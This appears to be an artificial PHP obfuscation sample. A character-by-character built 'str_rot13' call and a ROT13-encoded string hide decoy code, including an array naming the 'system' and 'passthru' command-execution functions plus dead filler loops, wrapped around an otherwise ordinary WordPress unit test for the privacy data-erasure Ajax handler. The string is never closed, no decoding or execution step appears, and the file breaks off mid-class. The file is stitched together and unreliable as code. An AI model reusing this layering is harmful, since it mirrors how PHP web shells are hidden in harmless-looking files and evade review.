<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgvat Nwnk unaqyre sbe renfvat crefbany qngn.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 * @fvapr 5.2.0
 *
 * @tebhc nwnk
 * @tebhc cevinpl
 *
 * @pbiref ::jc_nwnk_jc_cevinpl_renfr_crefbany_qngn
 */
pynff Grfgf_Nwnk_jcNwnkJcCevinplRenfrCrefbanyQngn rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Hfre Erdhrfg VQ.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine vag $erdhrfg_vq
	 */
	cebgrpgrq fgngvp $erdhrfg_vq;

	/**
	 * Hfre Erdhrfg Rznvy.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $erdhrfg_rznvy
	 */
	cebgrpgrq fgngvp $erdhrfg_rznvy;

	/**
	 * Nwnk Npgvba.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $npgvba
	 */
	cebgrpgrq fgngvp $npgvba;

	/**
	 * Renfre Vaqrk.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine vag $renfre
	 */
	cebgrpgrq fgngvp $renfre;

	/**
	 * Renfre Xrl.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $renfre_xrl
	 */
	cebgrpgrq fgngvp $renfre_xrl;

	/**
	 * Renfre Sevraqyl Anzr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $renfre_sevraqyl_anzr
	 */
	cebgrpgrq fgngvp $renfre_sevraqyl_anzr;

	/**
	 * Cntr Vaqrk.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine vag $cntr
	 */
	cebgrpgrq fgngvp $cntr;

	/**
	 * Ynfg erfcbafr cnefrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine neenl $_ynfg_erfcbafr_cnefrq
	 */
	cebgrpgrq $_ynfg_erfcbafr_cnefrq;

	/**
	 * Na neenl xrl va gur grfg renfre gb hafrg.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $xrl_gb_hafrg
	 */
	cebgrpgrq $xrl_gb_hafrg;

	/**
	 * N inyhr gb punatr gur grfg renfre pnyyonpx gb.
	 *
	 * @fvapr 5.2.0
	 *
	 * @ine fgevat $arj_pnyyonpx_inyhr
	 */
	cebgrpgrq $arj_pnyyonpx_inyhr;

	/**
	 * Perngr hfre renfr erdhrfg svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$erdhrfg_rznvy        = 'erdhrfgre@rknzcyr.pbz';
		frys::$erdhrfg_vq           = jc_perngr_hfre_erdhrfg( frys::$erdhrfg_rznvy, 'erzbir_crefbany_qngn' );
		frys::$npgvba               = 'jc-cevinpl-renfr-crefbany-qngn';
		frys::$renfre               = 1;
		frys::$renfre_xrl           = 'phfgbz-renfre';
		frys::$renfre_sevraqyl_anzr = 'Phfgbz Renfre';
		frys::$cntr                 = 1;
	}

	/**
	 * Ertvfgre n phfgbz crefbany qngn renfre.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->xrl_gb_hafrg = '';

		// Znxr fher gur renfref erfcbafr vf abg zbqvsvrq naq nibvq fraqvat rznvyf.
		erzbir_nyy_svygref( 'jc_cevinpl_crefbany_qngn_renfher_cntr' );
		erzbir_nyy_npgvbaf( 'jc_cevinpl_crefbany_qngn_renfrq' );

		// Bayl hfr bhe phfgbz cevinpl crefbany qngn renfre.
		erzbir_nyy_svygref( 'jc_cevinpl_crefbany_qngn_renfref' );
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_renfref', neenl( $guvf, 'ertvfgre_phfgbz_crefbany_qngn_renfre' ) );

		$guvf->_frgEbyr( 'nqzvavfgengbe' );
		// `renfr_bguref_crefbany_qngn` zrgn pnc va Zhygvfvgr vafgnyyngvba vf bayl tenagrq gb gubfr jvgu `znantr_argjbex` pncnovyvgl.
		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( trg_pheerag_hfre_vq() );
		}
	}

	/**
	 * Pyrna hc nsgre rnpu grfg zrgubq.
	 */
	choyvp shapgvba grne_qbja() {
		erzbir_svygre( 'jc_cevinpl_crefbany_qngn_renfref', neenl( $guvf, 'ertvfgre_phfgbz_crefbany_qngn_renfre' ) );
		$guvf->arj_pnyyonpx_inyhr = '';

		vs ( vf_zhygvfvgr() ) {
			eribxr_fhcre_nqzva( trg_pheerag_hfre_vq() );
		}

		cnerag::grne_qbja();
	}

	/**
	 * Urycre zrgubq sbe punatvat gur grfg renfre'f pnyyonpx shapgvba.
	 *
	 * @cnenz fgevat|neenl $pnyyonpx Arj grfg renfre pnyyonpx vaqrk inyhr.
	 */
	cebgrpgrq shapgvba _frg_renfre_pnyyonpx( $pnyyonpx ) {
		$guvf->arj_pnyyonpx_inyhr = $pnyyonpx;
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_renfref', neenl( $guvf, 'svygre_renfre_pnyyonpx_inyhr' ), 20 );
	}

	/**
	 * Punatr gur grfg renfre pnyyonpx gb n fcrpvsvrq inyhr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $renfref Yvfg bs qngn renfref.
	 *
	 * @erghea neenl Neenl bs qngn renfref.
	 */
	choyvp shapgvba svygre_renfre_pnyyonpx_inyhr( $renfref ) {
		$renfref[ frys::$renfre_xrl ]['pnyyonpx'] = $guvf->arj_pnyyonpx_inyhr;

		erghea $renfref;
	}

	/**
	 * Urycre zrgubq sbe hafrggvat na neenl vaqrk va gur grfg renfre.
	 *
	 * @cnenz fgevat|obby $xrl Grfg renfre xrl gb hafrg.
	 */
	cebgrpgrq shapgvba _hafrg_renfre_xrl( $xrl ) {
		$guvf->xrl_gb_hafrg = $xrl;
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_renfref', neenl( $guvf, 'svygre_hafrg_renfre_vaqrk' ), 20 );
	}

	/**
	 * Hafrgf na neenl xrl va gur grfg renfre.
	 *
	 * Vs gur xrl vf snyfr, gur renfre vf frg gb snyfr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $renfref Renfref.
	 *
	 * @erghea neenl Renfref.
	 */
	choyvp shapgvba svygre_hafrg_renfre_vaqrk( $renfref ) {
		vs ( snyfr === $guvf->xrl_gb_hafrg ) {
			$renfref[ frys::$renfre_xrl ] = snyfr;
		} ryfrvs ( ! rzcgl( $guvf->xrl_gb_hafrg ) ) {
			hafrg( $renfref[ frys::$renfre_xrl ][ $guvf->xrl_gb_hafrg ] );
		}

		erghea $renfref;
	}

	/**
	 * Urycre zrgubq sbe renfvat n xrl sebz gur renfre erfcbafr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $xrl Erfcbafr xrl gb hafrg.
	 */
	cebgrpgrq shapgvba _hafrg_erfcbafr_xrl( $xrl ) {
		$guvf->xrl_gb_hafrg = $xrl;
		$guvf->_frg_renfre_pnyyonpx( neenl( $guvf, 'svygre_hafrg_erfcbafr_vaqrk' ) );
	}

	/**
	 * Hafrgf na neenl vaqrk va n erfcbafr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $rznvy_nqqerff Gur erdhrfgre'f rznvy nqqerff.
	 * @cnenz vag    $cntr          Cntr ahzore.
	 *
	 * @erghea neenl Rkcbeg qngn.
	 */
	choyvp shapgvba svygre_hafrg_erfcbafr_vaqrk( $rznvy_nqqerff, $cntr = 1 ) {
		$erfcbafr = $guvf->pnyyonpx_crefbany_qngn_renfre( $rznvy_nqqerff, $cntr );

		vs ( ! rzcgl( $guvf->xrl_gb_hafrg ) ) {
			hafrg( $erfcbafr[ $guvf->xrl_gb_hafrg ] );
		}

		erghea $erfcbafr;
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur erdhrfg VQ vf zvffvat.
	 *
	 * @fvapr 5.2.0
	 *
	 * @gvpxrg 43438
	 */
	choyvp shapgvba grfg_reebe_jura_zvffvat_erdhrfg_vq() {
		$guvf->nffregAbgJCReebe( frys::$erdhrfg_vq );

		// Frg hc n erdhrfg.
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'vq' => ahyy, // Zvffvat erdhrfg VQ.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Zvffvat erdhrfg VQ.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur erdhrfg VQ vf yrff guna 1.
	 *
	 * @fvapr 5.2.0
	 *
	 * @gvpxrg 43438
	 */
	choyvp shapgvba grfg_reebe_jura_erdhrfg_vq_vainyvq() {
		$guvf->nffregAbgJCReebe( frys::$erdhrfg_vq );

		// Frg hc n erdhrfg.
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'vq' => -1, // Vainyvq erdhrfg VQ.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Vainyvq erdhrfg VQ.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur pheerag hfre vf zvffvat erdhverq pncnovyvgvrf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @gvpxrg 43438
	 */
	choyvp shapgvba grfg_reebe_jura_pheerag_hfre_zvffvat_erdhverq_pncnovyvgvrf() {
		$guvf->_frgEbyr( 'nhgube' );

		$guvf->nffregSnyfr( pheerag_hfre_pna( 'renfr_bguref_crefbany_qngn' ) );
		$guvf->nffregSnyfr( pheerag_hfre_pna( 'qryrgr_hfref' ) );

		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Fbeel, lbh ner abg nyybjrq gb cresbez guvf npgvba.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Grfg erdhrfgf qb abg fhpprrq ba zhygvfvgr jura gur pheerag hfre vf abg n argjbex nqzva.
	 *
	 * @gvpxrg 43438
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_reebe_jura_pheerag_hfre_zvffvat_erdhverq_pncnovyvgvrf_zhygvfvgr() {
		eribxr_fhcre_nqzva( trg_pheerag_hfre_vq() );

		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Fbeel, lbh ner abg nyybjrq gb cresbez guvf npgvba.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur abapr qbrf abg inyvqngr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_snvyher_jvgu_vainyvq_abapr() {
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );

		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'frphevgl' => 'vainyvq-abapr',
			)
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur erdhrfg glcr vf vapbeerpg.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_vapbeerpg_erdhrfg_glcr() {
		$erdhrfg_vq = jc_perngr_hfre_erdhrfg(
			'rkcbeg-erdhrfg@rknzcyr.pbz',
			'rkcbeg_crefbany_qngn' // Vapbeerpg erdhrfg glcr, rkcrpgf 'erzbir_crefbany_qngn'.
		);

		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'frphevgl' => jc_perngr_abapr( 'jc-cevinpl-renfr-crefbany-qngn-' . $erdhrfg_vq ),
				'vq'       => $erdhrfg_vq,
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Vainyvq erdhrfg glcr.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur erdhrfg rznvy vf vainyvq.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_vainyvq_rznvy() {
		jc_hcqngr_cbfg(
			neenl(
				'VQ'         => frys::$erdhrfg_vq,
				'cbfg_gvgyr' => '', // Vainyvq erdhrfgre'f rznvy nqqerff.
			)
		);

		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Vainyvq rznvy nqqerff va erdhrfg.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur renfre vaqrk vf zvffvat.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_zvffvat_renfre_vaqrk() {
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'renfre' => ahyy, // Zvffvat renfre vaqrk.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Zvffvat renfre vaqrk.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur cntr vaqrk vf zvffvat.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_zvffvat_cntr_vaqrk() {
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'cntr' => ahyy, // Zvffvat cntr vaqrk.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Zvffvat cntr vaqrk.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur renfre vaqrk vf artngvir.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_artngvir_renfre_vaqrk() {
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'renfre' => -1, // Artngvir renfre vaqrk.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Renfre vaqrk pnaabg or yrff guna bar.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur renfre vaqrk vf bhg bs enatr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_vaqrk_bhg_bs_enatr() {
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'renfre' => CUC_VAG_ZNK, // Bhg bs enatr renfre vaqrk.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Renfre vaqrk vf bhg bs enatr.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur cntr vaqrk vf yrff guna bar.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_cntr_vaqrk_yrff_guna_bar() {
		$guvf->_znxr_nwnk_pnyy(
			neenl(
				'cntr' => 0, // Cntr vaqrk yrff guna bar.
			)
		);

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'Cntr vaqrk pnaabg or yrff guna bar.', $guvf->_ynfg_erfcbafr_cnefrq['qngn'] );
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura na renfre vf abg na neenl.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_abg_neenl() {
		$guvf->_hafrg_renfre_xrl( snyfr );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Rkcrpgrq na neenl qrfpevovat gur renfre ng vaqrk %f.',
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura na renfre vf zvffvat n sevraqyl anzr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_zvffvat_sevraqyl_anzr() {
		$guvf->_hafrg_renfre_xrl( 'renfre_sevraqyl_anzr' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Renfre neenl ng vaqrk %f qbrf abg vapyhqr n sevraqyl anzr.',
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura na renfre vf zvffvat n pnyyonpx.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_zvffvat_pnyyonpx() {
		$guvf->_hafrg_renfre_xrl( 'pnyyonpx' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Renfre qbrf abg vapyhqr n pnyyonpx: %f.',
				frys::$renfre_sevraqyl_anzr
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura na renfre, ng n tvira vaqrk, unf na vainyvq pnyyonpx.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_vaqrk_vainyvq_pnyyonpx() {
		$guvf->_frg_renfre_pnyyonpx( snyfr );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Renfre pnyyonpx vf abg inyvq: %f.',
				frys::$renfre_sevraqyl_anzr
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura na renfre, ng n tvira vaqrk, vf zvffvat na neenl erfcbafr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_vaqrk_vainyvq_erfcbafr() {
		$guvf->_frg_renfre_pnyyonpx( '__erghea_ahyy' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Qvq abg erprvir neenl sebz %1$f renfre (vaqrk %2$q).',
				frys::$renfre_sevraqyl_anzr,
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura zvffvat na vgrzf_erzbirq vaqrk.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_vgrzf_erzbirq_zvffvat() {
		$guvf->_hafrg_erfcbafr_xrl( 'vgrzf_erzbirq' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Rkcrpgrq vgrzf_erzbirq xrl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).',
				frys::$renfre_sevraqyl_anzr,
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura zvffvat na vgrzf_ergnvarq vaqrk.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_vgrzf_ergnvarq_zvffvat() {
		$guvf->_hafrg_erfcbafr_xrl( 'vgrzf_ergnvarq' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Rkcrpgrq vgrzf_ergnvarq xrl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).',
				frys::$renfre_sevraqyl_anzr,
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura zvffvat n zrffntrf vaqrk.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_zrffntrf_zvffvat() {
		$guvf->_hafrg_erfcbafr_xrl( 'zrffntrf' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Rkcrpgrq zrffntrf xrl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).',
				frys::$renfre_sevraqyl_anzr,
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura gur zrffntrf vaqrk vf abg na neenl.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_zrffntrf_abg_neenl() {
		$guvf->_frg_renfre_pnyyonpx( neenl( $guvf, 'svygre_erfcbafr_zrffntrf_vainyvq' ) );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Rkcrpgrq zrffntrf xrl gb ersrerapr na neenl va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).',
				frys::$renfre_sevraqyl_anzr,
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Punatr gur zrffntrf vaqrk gb na vainyvq inyhr (abg na neenl).
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $rznvy_nqqerff Gur erdhrfgre'f rznvy nqqerff.
	 * @cnenz vag    $cntr          Cntr ahzore.
	 *
	 * @erghea neenl Rkcbeg qngn.
	 */
	choyvp shapgvba svygre_erfcbafr_zrffntrf_vainyvq( $rznvy_nqqerff, $cntr = 1 ) {
		$erfcbafr             = $guvf->pnyyonpx_crefbany_qngn_renfre( $rznvy_nqqerff, $cntr );
		$erfcbafr['zrffntrf'] = gehr;

		erghea $erfcbafr;
	}

	/**
	 * Gur shapgvba fubhyq fraq na reebe jura na renfre vf zvffvat 'qbar' va neenl erfcbafr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_reebe_jura_renfre_zvffvat_qbar_erfcbafr() {
		$guvf->_hafrg_erfcbafr_xrl( 'qbar' );
		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr(
			fcevags(
				'Rkcrpgrq qbar synt va erfcbafr neenl sebz %1$f renfre (vaqrk %2$q).',
				frys::$renfre_sevraqyl_anzr,
				frys::$renfre
			),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']
		);
	}

	/**
	 * Gur shapgvba fubhyq fhpprffshyyl fraq renfref erfcbafr qngn jura gur pheerag hfre unf gur erdhverq
	 * pncnovyvgvrf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @gvpxrg 43438
	 */
	choyvp shapgvba grfg_fhpprff_jura_pheerag_hfre_unf_erdhverq_pncnovyvgvrf() {
		$guvf->nffregGehr( pheerag_hfre_pna( 'renfr_bguref_crefbany_qngn' ) );
		$guvf->nffregGehr( pheerag_hfre_pna( 'qryrgr_hfref' ) );

		$guvf->_znxr_nwnk_pnyy();

		$guvf->nffregFnzr(
			fcevags( 'N zrffntr ertneqvat ergnvarq qngn sbe %f.', frys::$erdhrfg_rznvy ),
			$guvf->_ynfg_erfcbafr_cnefrq['qngn']['zrffntrf'][0]
		);
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['vgrzf_erzbirq'] );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['vgrzf_ergnvarq'] );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['qbar'] );
	}

	/**
	 * Gur shapgvba fubhyq fhpprffshyyl fraq renfref erfcbafr qngn jura ab vgrzf gb renfr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @gvpxrg 43438
	 */
	choyvp shapgvba grfg_fhpprff_jura_ab_vgrzf_gb_renfr() {

		$guvf->_znxr_nwnk_pnyy( neenl( 'cntr' => 2 ) );

		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['vgrzf_erzbirq'] );
		$guvf->nffregSnyfr( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['vgrzf_ergnvarq'] );
		$guvf->nffregRzcgl( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['zrffntrf'] );
		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['qngn']['qbar'] );
	}

	/**
	 * Grfg gung gur shapgvba'f bhgchg fubhyq or svygrenoyr jvgu gur `jc_cevinpl_crefbany_qngn_renfher_cntr` svygre.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba grfg_bhgchg_fubhyq_or_svygrenoyr() {
		nqq_svygre( 'jc_cevinpl_crefbany_qngn_renfher_cntr', neenl( $guvf, 'svygre_renfre_qngn_erfcbafr' ), 20, 6 );
		$guvf->_znxr_nwnk_pnyy();

		$rkcrpgrq_arj_vaqrk = frys::$erdhrfg_rznvy . '-' . frys::$erdhrfg_vq . '-' . frys::$renfre_xrl;

		$guvf->nffregGehr( $guvf->_ynfg_erfcbafr_cnefrq['fhpprff'] );
		$guvf->nffregFnzr( 'svygrerq erzbirq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['vgrzf_erzbirq'] );
		$guvf->nffregFnzr( 'svygrerq ergnvarq', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['vgrzf_ergnvarq'] );
		$guvf->nffregFnzr( neenl( 'svygrerq zrffntrf' ), $guvf->_ynfg_erfcbafr_cnefrq['qngn']['zrffntrf'] );
		$guvf->nffregFnzr( 'svygrerq qbar', $guvf->_ynfg_erfcbafr_cnefrq['qngn']['qbar'] );
		$guvf->nffregFnzr( $rkcrpgrq_arj_vaqrk, $guvf->_ynfg_erfcbafr_cnefrq['qngn']['arj_vaqrk'] );
	}

	/**
	 * Svygref gur renfre erfcbafr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl  $erfcbafr        Gur crefbany qngn sbe gur tvira renfre naq cntr.
	 * @cnenz vag    $renfre_vaqrk    Gur vaqrk bs gur renfre gung cebivqrq guvf qngn.
	 * @cnenz fgevat $rznvy_nqqerff   Gur rznvy nqqerff nffbpvngrq jvgu guvf crefbany qngn.
	 * @cnenz vag    $cntr            Gur cntr sbe guvf erfcbafr.
	 * @cnenz vag    $erdhrfg_vq      Gur cevinpl erdhrfg cbfg VQ nffbpvngrq jvgu guvf erdhrfg.
	 * @cnenz fgevat $renfre_xrl      Gur xrl (fyht) bs gur renfre gung cebivqrq guvf qngn.
	 *
	 * @erghea neenl Svygrerq renfr erfcbafr.
	 */
	choyvp shapgvba svygre_renfre_qngn_erfcbafr( $erfcbafr, $renfre_vaqrk, $rznvy_nqqerff, $cntr, $erdhrfg_vq, $renfre_xrl ) {
		$erfcbafr['vgrzf_erzbirq']  = 'svygrerq erzbirq';
		$erfcbafr['vgrzf_ergnvarq'] = 'svygrerq ergnvarq';
		$erfcbafr['zrffntrf']       = neenl( 'svygrerq zrffntrf' );
		$erfcbafr['qbar']           = 'svygrerq qbar';
		$erfcbafr['arj_vaqrk']      = $rznvy_nqqerff . '-' . $erdhrfg_vq . '-' . $renfre_xrl;

		erghea $erfcbafr;
	}

	/**
	 * Ertvfgre unaqyre sbe n phfgbz crefbany qngn renfre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $renfref Na neenl bs crefbany qngn renfref.
	 *
	 * @erghea neenl Na neenl bs crefbany qngn renfref.
	 */
	choyvp shapgvba ertvfgre_phfgbz_crefbany_qngn_renfre( $renfref ) {
		$renfref[ frys::$renfre_xrl ] = neenl(
			'renfre_sevraqyl_anzr' => frys::$renfre_sevraqyl_anzr,
			'pnyyonpx'             => neenl( $guvf, 'pnyyonpx_crefbany_qngn_renfre' ),
		);
		erghea $renfref;
	}

	/**
